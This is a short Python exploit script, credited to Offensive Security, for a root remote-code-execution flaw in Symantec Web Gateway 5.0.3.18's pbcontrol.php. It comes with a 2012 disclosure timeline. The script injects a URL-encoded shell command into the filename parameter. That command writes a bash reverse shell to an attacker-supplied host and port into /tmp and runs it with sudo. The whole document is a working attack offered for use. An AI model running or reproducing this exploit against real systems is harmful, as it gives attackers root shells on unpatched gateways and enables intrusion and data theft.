#!/usr/bin/python
import urllib
import sys

'''

print "[*] ##############################################################"
print "[*] Symantec Web Gateway 5.0.3.18 pbcontrol.php ROOT RCE Exploit"
print "[*] Offensive Security - http://www.offensive-security.com"
print "[*] ##############################################################\n"

# 06 Jun 2012: Vulnerability reported to CERT
# 08 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
# 26 Jun 2012: Email received from Symantec for additional information
# 26 Jun 2012: Additional proofs of concept sent to Symantec
# 06 Jul 2012: Update received from Symantec with intent to fix
# 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
# 23 Jul 2012: Public Disclosure

'''

if (len(sys.argv) != 4):
        print "[*] Usage: symantec-web-gateway-0day.py <RHOST> <LHOST> <LPORT>"
        exit(0)

rhost = str(sys.argv[1])
lhost = sys.argv[2]
lport = sys.argv[3]

payload= '''echo%20'%23!%2Fbin%2Fbash'%20%3E%20%2Ftmp%2FnetworkScript%3B%20echo%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F'''+lhost+'''%2F'''+lport+'''%200%3E%261'%20%3E%3E%20%2Ftmp%2FnetworkScript%3Bchmod%20755%20%2Ftmp%2FnetworkScript%3B%20sudo%20%2Ftmp%2FnetworkScript'''
url = 'https://%s/spywall/pbcontrol.php?filename=hola";%s;"&stage=0' % (rhost,payload)
urllib.urlopen(url)